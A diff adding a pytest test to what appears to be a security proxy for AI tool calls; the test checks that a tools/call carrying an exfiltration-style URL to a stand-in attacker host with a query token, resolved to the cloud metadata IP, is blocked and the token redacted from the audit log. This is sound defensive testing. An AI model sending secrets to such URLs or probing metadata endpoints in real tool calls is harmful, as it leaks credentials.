@@ -543,3 +543,34 @@ def test_upstream_hostname_resolving_to_metadata_ip_is_blocked_before_any_dispat
     assert response.status_code == 200
     assert response.json()["error"]["code"] == -32003
     assert httpx_mock.get_requests() == []
+
+
+def test_tool_argument_url_secret_is_redacted_in_audit(httpx_mock, monkeypatch):
+    """C3: a tools/call URL with query secrets must not leak into the signed audit chain."""
+    _override_policy({"allowed_tools": ["search_docs"], "blocked_tools": []})
+
+    async def _fake_resolve(host):
+        return ["169.254.169.254"]
+
+    monkeypatch.setattr("llm_shield_proxy.security.egress_guard._default_resolve", _fake_resolve)
+
+    with patch("llm_shield_proxy.observability.audit.AuditLogger.log_security_event") as mock_log:
+        response = client.post(
+            "/v1/mcp",
+            headers={"X-Shield-Virtual-Key": "test-key", "X-Shield-Upstream-URL": UPSTREAM_URL},
+            json={
+                "jsonrpc": "2.0",
+                "id": 9,
+                "method": "tools/call",
+                "params": {
+                    "name": "search_docs",
+                    "arguments": {"q": "http://evil.example.com/upload?token=SUPERSECRET"},
+                },
+            },
+        )
+
+    assert response.json()["error"]["code"] == -32003
+    details = mock_log.call_args[1]["details"]
+    assert "SUPERSECRET" not in details["blocked_url"]
+    assert "token=" not in details["blocked_url"]
+    assert details["blocked_url"] == "http://evil.example.com/upload"
